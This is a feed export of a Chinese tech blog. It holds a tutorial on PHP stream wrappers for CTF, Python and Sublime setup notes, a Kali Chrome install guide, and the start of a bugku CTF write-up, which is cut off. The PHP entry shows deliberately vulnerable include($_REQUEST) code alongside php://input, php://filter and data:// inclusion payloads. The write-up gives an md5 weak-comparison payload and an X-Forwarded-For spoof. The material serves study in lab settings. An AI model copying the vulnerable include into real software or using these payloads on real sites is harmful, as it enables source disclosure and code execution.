        &lt;p&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;298&quot; height=&quot;52&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
  </entry>
  
  <entry>
    <title>php伪协议学习</title>
    <link href="http://yoursite.com/2018/07/12/phpagree/"/>
    <id>http://yoursite.com/2018/07/12/phpagree/</id>
    <published>2018-07-12T05:51:09.000Z</published>
    <updated>2018-07-14T09:26:55.753Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://php.net/manual/zh/wrappers.php" target="_blank" rel="noopener">php支持的协议和封装的协议:</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure><p>CTF中主要出现的是<code>php://</code>,<code>zlib</code>,<code>data</code>,<code>phar</code>,所以文章主要研究的是这四种，其他的只是简单的学习一下。</p><h2 id="file-、http-amp-https、ftp-amp-ftps-、glob"><a href="#file-、http-amp-https、ftp-amp-ftps-、glob" class="headerlink" title="file://、http://&amp;https、ftp://&amp;ftps://、glob://"></a>file://、http://&amp;https、ftp://&amp;ftps://、glob://</h2><h3 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h3><p>文件系统 是 PHP 使用的默认封装协议，展现了本地文件系统。<br><code>1.php</code>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$hello = &apos;hello,world&apos;;</span><br><span class="line">echo $hello;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><code>2.php</code>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_REQUEST[&apos;s&apos;]);</span><br><span class="line">var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpagree/2.php?s=file:///绝对路径\1.php</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-12/56604002.jpg" alt="" title="" class="">                <p></p>            </figure><p>此时回显的是hello,world，这里有个小问题，<code>1.php</code>中的<code>echo</code>执行了，但是<code>2.php</code>中却是空的，这是因为已经被解析了，查看源代码即可看到。<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-12/41670873.jpg" alt="" title="" class="">                <p></p>            </figure></p><h3 id="http-amp-https"><a href="#http-amp-https" class="headerlink" title="http://&amp;https://"></a>http://&amp;https://</h3><p>允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。 HTTP 请求会附带一个 Host: 头，用于兼容基于域名的虚拟主机。 如果在你的 php.ini 文件中或字节流上下文（context）配置了 user_agent 字符串，它也会被包含在请求之中。<br><code>1.php</code>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$hello = &apos;hello,world&apos;;</span><br><span class="line">echo $hello;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><code>2.php</code>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpagree/2.php?s=http://127.0.0.1/phpagree/1.php</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-12/6298269.jpg" alt="" title="" class="">                <p></p>            </figure><p>此时回显的是hello,world，并且就是<code>http://127.0.0.1/phpagree/1.php</code>的内容</p><h3 id="ftp-amp-ftps"><a href="#ftp-amp-ftps" class="headerlink" title="ftp://&amp;ftps://"></a>ftp://&amp;ftps://</h3><p>允许通过 FTP 读取存在的文件，以及创建新文件。 如果服务器不支持被动（passive）模式的 FTP，连接会失败。<br>由于暂时没有搭建ftp的服务器，所以暂时无法演示。</p><h3 id="glob"><a href="#glob" class="headerlink" title="glob://"></a>glob://</h3><p>查找匹配的文件路径模式<br><code>1.php</code>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$hello = &apos;hello,world&apos;;</span><br><span class="line">echo $hello;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><code>2.php</code>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 循环 ext/spl/examples/ 目录里所有 *.php 文件</span><br><span class="line">// 并打印文件名和文件尺寸</span><br><span class="line">$it = new DirectoryIterator($_REQUEST[&apos;s&apos;]);</span><br><span class="line"></span><br><span class="line">foreach($it as $f) &#123;</span><br><span class="line"></span><br><span class="line">    printf(&quot;%s: %.1FK\n&quot;, $f-&gt;getFilename(), $f-&gt;getSize()/1024);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>结果如下<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-12/78633720.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="php-、data-、zlib-、phar"><a href="#php-、data-、zlib-、phar" class="headerlink" title="php://、data://、zlib://、phar://"></a>php://、data://、zlib://、phar://</h2><h3 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h3><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><p>首先要确保，在<code>php.in</code>i中<code>allow_url_include</code>设置为<code>On</code>,因为<code>allow_url_include</code>依赖于<code>allow_url_fopen</code>，所以<code>allow_url_fopen</code>也需要开启。</p><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>访问请求的原始数据的只读流，可以接收到post的数据，但是当<code>enctype=”multipart/form-data”</code> 的时，<code>php://input</code>无效</p><p><code>1.php</code>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$hello = &apos;hello,world&apos;;</span><br><span class="line">echo $hello;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><code>2.php</code>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&apos;s&apos;]);</span><br><span class="line">var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpagree/2.php?s=php://input</span><br></pre></td></tr></table></figure></p><p>并且POST<code>1.php</code><br>此时回显:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-12/54198500.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>可以看到1.php直接被当成了一个字符串，并没有解析。<br>但是当POST<code>&lt;?php echo &#39;hello,world&#39;; ?&gt;</code>时，直接就解析了：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-12/55013943.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>因为php://input相当于直接包含了<code>&lt;?php echo &#39;hello,world&#39;; ?&gt;</code>，并且解析，类似于include。</p><h4 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h4><p> 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p><p><code>2.php</code>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$output = fopen($_REQUEST[&apos;s&apos;],&apos;w&apos;);</span><br><span class="line">fwrite($output, &quot;hello,world&quot;);</span><br><span class="line">fclose($output);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpagree/2.php?s=php://output</span><br></pre></td></tr></table></figure></p><p>此时回显:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-12/22360859.jpg" alt="" title="" class="">                <p></p>            </figure></p><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p><p>参数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource=&lt;要过滤的数据流&gt;这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read=&lt;读链的筛选列表&gt;该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选列表&gt;该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure></p><p><code>1.php</code>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$hello = &apos;hello,world&apos;;</span><br><span class="line">echo $hello;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><code>2.php</code>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_REQUEST[&apos;s&apos;]);</span><br><span class="line">//var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>此时的回显是:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-12/9766307.jpg" alt="" title="" class="">                <p></p>            </figure></p><p><code>base64</code>解码之后就是<code>1.php</code>的内容了</p><p>再来看一下bugku上题的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL?file=php://filter//read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p><p>比如这个<code>payload</code>中<code>read=convert.base64-encode</code>，<code>resource=index.php</code>，<br>过滤器还有很多种，这里给出<a href="http://php.net/manual/zh/filters.php" target="_blank" rel="noopener">官方文档</a><br>CTF中用的最多的还是<code>convert.base64-encode</code>，其他的了解一下就好。<br>还有一个小问题，为什么<code>include</code>的时候没有解析，因为经过<code>base64</code>编码后，不会被直接解析。</p><h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>数据（RFC 2397）<br>用法<code>data://text/plain;base64,</code></p><p><code>2.php</code>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_REQUEST[&apos;s&apos;]);</span><br><span class="line">//var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpagree/2.php?s=data://text/plain;base64,PD9waHANCgkkaGVsbG8gPSAnaGVsbG8sd29ybGQnOw0KCWVjaG8gJGhlbGxvOw0KPz4=</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-12/35586333.jpg" alt="" title="" class="">                <p></p>            </figure><p>即可得到hello,world,因为<code>PD9waHANCgkkaGVsbG8gPSAnaGVsbG8sd29ybGQnOw0KCWVjaG8gJGhlbGxvOw0KPz4=</code>base64解码之后就是<code>1.php</code>的内容，include包含之后就解析成功了。</p><p>来看<code>hackinglab</code>一道题的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL?^.^=data://text/plain;charset=unicode,(●&apos;◡&apos;●)</span><br></pre></td></tr></table></figure></p><p>wp不仔细说，用法<code>data:[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt;</code></p><h3 id="zlib-amp-phar"><a href="#zlib-amp-phar" class="headerlink" title="zlib://&amp;phar://"></a>zlib://&amp;phar://</h3><h4 id="zlib"><a href="#zlib" class="headerlink" title="zlib://"></a>zlib://</h4><p>压缩流<br>用法<code>zip://archive.zip#dir/file.txt</code></p><h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><p>PHP 归档<br>用法类似于<code>zlib://</code>，这两种主要是用于<code>getshell</code>，本地不方便做实验，所以就不用演示了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://php.net/manual/zh/wrappers.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;php支持的协议和封装的协议:&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;t
      
    
    </summary>
    
      <category term="php" scheme="http://yoursite.com/categories/php/"/>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="伪协议" scheme="http://yoursite.com/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>sublime分别配置python2&amp;3编译环境</title>
    <link href="http://yoursite.com/2018/07/09/sublimepy/"/>
    <id>http://yoursite.com/2018/07/09/sublimepy/</id>
    <published>2018-07-09T06:36:37.000Z</published>
    <updated>2018-07-10T05:19:30.913Z</updated>
    
    <content type="html"><![CDATA[<h3 id="新建sublime-build文件"><a href="#新建sublime-build文件" class="headerlink" title="新建sublime-build文件"></a>新建sublime-build文件</h3><p>在上方菜单栏打开工具(T)-&gt;编译系统(U)-&gt;新编译系统，<br>此时会出来一个文件：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-9/83241640.jpg" alt="" title="" class="">                <p></p>            </figure><br>将以下代码覆盖上去即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> &quot;cmd&quot;: [&quot;这里写python安装的目录/python.exe&quot;, &quot;-u&quot;, &quot;$file&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因为我配置的是python27的环境，所以保存的文件名写上<code>python27.sublime-build</code>，python3也类似，保存即可。<br>此时在编译环境下可以看到<code>python27</code>了<br>(sublime在编译环境中有一个预存的python，它的环境配置是默认在<code>cmd</code>中输入<code>python</code>的编译环境，我这里输入python是python3的环境，所以添加<code>python2</code>的环境)</p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>新建一个py文件，输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print &apos;hello</span><br><span class="line">&apos;</span><br></pre></td></tr></table></figure></p><p>测试，<code>ctrl+b</code>快捷编译<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-9/40937.jpg" alt="" title="" class="">                <p></p>            </figure><br>编译成功，可以使用了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;新建sublime-build文件&quot;&gt;&lt;a href=&quot;#新建sublime-build文件&quot; class=&quot;headerlink&quot; title=&quot;新建sublime-build文件&quot;&gt;&lt;/a&gt;新建sublime-build文件&lt;/h3&gt;&lt;p&gt;在上方菜单栏打开工具
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
      <category term="sublime" scheme="http://yoursite.com/tags/sublime/"/>
    
  </entry>
  
  <entry>
    <title>Windows下python2&amp;3环境变量及pip2&amp;3冲突设置</title>
    <link href="http://yoursite.com/2018/07/09/python23/"/>
    <id>http://yoursite.com/2018/07/09/python23/</id>
    <published>2018-07-09T05:52:45.000Z</published>
    <updated>2018-07-10T05:19:37.056Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-安装Python"><a href="#1-安装Python" class="headerlink" title="1.安装Python"></a>1.安装Python</h3><p>这一步比较简单，去官网上下载安装就行了，<a href="https://www.python.org/downloads/windows/" target="_blank" rel="noopener">下载链接</a></p><h3 id="2-配置环境变量"><a href="#2-配置环境变量" class="headerlink" title="2.配置环境变量"></a>2.配置环境变量</h3><p>右键我的电脑-&gt;属性-&gt;高级系统设置-&gt;环境变量<br>在Path栏双击，点击新建，将<code>Python2&amp;3</code>的安装目录分别添加进去，这里均适用默认目录:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-9/34244252.jpg" alt="" title="" class="">                <p></p>            </figure><p>此时在cmd输入<code>Python</code>，如果有效的话，证明环境变量已经设置好了。<br>若想输入<code>python2&amp;3</code>分别出现<code>python2</code>和<code>python3</code>的话，将安装目录下的<code>python.exe</code>更改为python2或3即可。</p><h3 id="3-解决pip2-amp-3问题"><a href="#3-解决pip2-amp-3问题" class="headerlink" title="3.解决pip2&amp;3问题"></a>3.解决pip2&amp;3问题</h3><p>若出现<code>unable to create process using &#39;&quot;&#39;</code>，可能是pip版本过低<br>输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python36 -m pip install -U pip</span><br></pre></td></tr></table></figure></p><p>即可<br>若还是不行，将python3安装目录下的<code>Scripts/pip.exe</code>删除后就能正常使用</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1-安装Python&quot;&gt;&lt;a href=&quot;#1-安装Python&quot; class=&quot;headerlink&quot; title=&quot;1.安装Python&quot;&gt;&lt;/a&gt;1.安装Python&lt;/h3&gt;&lt;p&gt;这一步比较简单，去官网上下载安装就行了，&lt;a href=&quot;https://w
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
      <category term="pip" scheme="http://yoursite.com/tags/pip/"/>
    
  </entry>
  
  <entry>
    <title>Kali Linux中如何安装Google Chrome并安装插件</title>
    <link href="http://yoursite.com/2018/06/24/kali-google/"/>
    <id>http://yoursite.com/2018/06/24/kali-google/</id>
    <published>2018-06-24T07:15:53.000Z</published>
    <updated>2018-06-24T10:52:52.226Z</updated>
    
    <content type="html"><![CDATA[<p>因为一些原因，需要在Windows下Centos的VMware虚拟机中kali的KVM虚拟机中安装Google浏览器，做个笔记</p><h2 id="安装Google-Chrome"><a href="#安装Google-Chrome" class="headerlink" title="安装Google Chrome"></a>安装Google Chrome</h2><p>使用<code>wget</code>命令下载Google Chrome的debian安装包<br>在shell中输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-24/32975304.jpg" alt="" title="" class="">                <p></p>            </figure><p>下载完之后我们准备安装,输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i google-chrome-stable_current_amd64.deb</span><br></pre></td></tr></table></figure></p><p>但是此时会出现依赖问题：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-24/59498188.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>输入以下命令后解决</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get -f install</span><br></pre></td></tr></table></figure><p>选择 y</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-24/63318071.jpg" alt="" title="" class="">                <p></p>            </figure><p>解决完依赖问题后即可正常安装，运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">google-chrome</span><br></pre></td></tr></table></figure><p>会提示：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-24/20807387.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>没有–no-sandbox 不支持root用户使用，虽然可以在后面加上–no-sandbox的命令，但是一般我们使用google浏览器是在GUI界面上使的。<br>所以这里再介绍GUI界面如何解决：</p><p>首先在<code>/usr/share/applications</code>找到<code>Google-Chrome</code><br>然后右键图标-&gt;文件属性-&gt;桌面项-&gt;命令</p><p>在stable后面加上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--no-sandbox --user-data-dir&amp;</span><br></pre></td></tr></table></figure><p>注意空格,然后点击确认即可。</p><h2 id="Kali中Google-Chrome安装插件"><a href="#Kali中Google-Chrome安装插件" class="headerlink" title="Kali中Google-Chrome安装插件"></a>Kali中Google-Chrome安装插件</h2><p>可以直接在Kali中的Google-Chrome下载插件，但是需要<code>挂梯子</code>，因为我不会在kali里科学上网，所以只能导入安装包了。</p><p>首先需要得到安装包，而得到安装包的方法一般有两种： </p><ul><li>从网上下载安装包</li><li>从Windows上的Google Chrome中导出安装包</li></ul><p>这里建议从Windows上导出，因为网上下载的.crx文件部分不能用。</p><h3 id="从Windows上的Google-Chrome中导出安装包："><a href="#从Windows上的Google-Chrome中导出安装包：" class="headerlink" title="从Windows上的Google Chrome中导出安装包："></a>从Windows上的Google Chrome中导出安装包：</h3><p>首先你的电脑肯定需要<code>挂梯子</code>，不会的可以<a href="https://cherrygk.github.io/2018/05/27/ssr/" target="_blank" rel="noopener">点此学习ssr的搭建</a><br>然后登录google账户，在应用商店里下载插件。</p><p>下载完需要的插件之后点击浏览器右上方的菜单-&gt;更多工具-&gt;扩展程序。<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-24/34446398.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>点击打包扩展程序，会让你输入目录，我们先点击取消</p><p>点击所需要安装插件的详细信息，可以看到有个ID值：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-24/36091676.jpg" alt="" title="" class="">                <p></p>            </figure><p>需要从浏览器安装的插件目录中找到这个ID值,插件安装的位置一般是默认在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Extensions</span><br></pre></td></tr></table></figure><p>其中user是你电脑的用户名，找到文件夹之后，打开文件夹，里面有个版本的文件夹，继续打开直到:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-24/58188056.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>此时将文件夹路径复制下来输入到刚刚填写的目录中，再点击打包扩展程序即可。</p><p>此时会出来扩展程序和秘钥文件：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-24/20761532.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>我们需要的是.crx文件，将路径记下来，打开xftp连接kali进行文件传输</p><p>将文件传进去即可。<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-24/15704054.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>然后进入kali的GUI界面打开Google浏览器，打开扩展程序页面：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-24/26940313.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>将刚刚的.crx文件拖进去即可完成安装<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-24/24082365.jpg" alt="" title="" class="">                <p></p>            </figure></p><iframe type="music" frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=30621896&auto=1&height=66"></iframe>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;因为一些原因，需要在Windows下Centos的VMware虚拟机中kali的KVM虚拟机中安装Google浏览器，做个笔记&lt;/p&gt;
&lt;h2 id=&quot;安装Google-Chrome&quot;&gt;&lt;a href=&quot;#安装Google-Chrome&quot; class=&quot;headerlink
      
    
    </summary>
    
      <category term="技术分享" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>bugku writeup(Web2）</title>
    <link href="http://yoursite.com/2018/06/06/bugku2/"/>
    <id>http://yoursite.com/2018/06/06/bugku2/</id>
    <published>2018-06-06T08:10:51.000Z</published>
    <updated>2018-10-16T07:39:49.352Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web-2"><a href="#Web-2" class="headerlink" title="Web(2)"></a>Web(2)</h1><h2 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h2><p>题目提示md5，先试试弱类型比较的漏洞<code>240610708</code></p><p>直接拿到flag,payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/md5.php?a=240610708</span><br></pre></td></tr></table></figure></p><h2 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h2><p>题目提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请从本地访问!</span><br></pre></td></tr></table></figure></p><p>直接构造<code>XFF</code>,在消息头里加上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure></p><p>直接拿到flag</p><h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><p>题目直接给了源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&apos;flag.php&apos;); </span><br><span 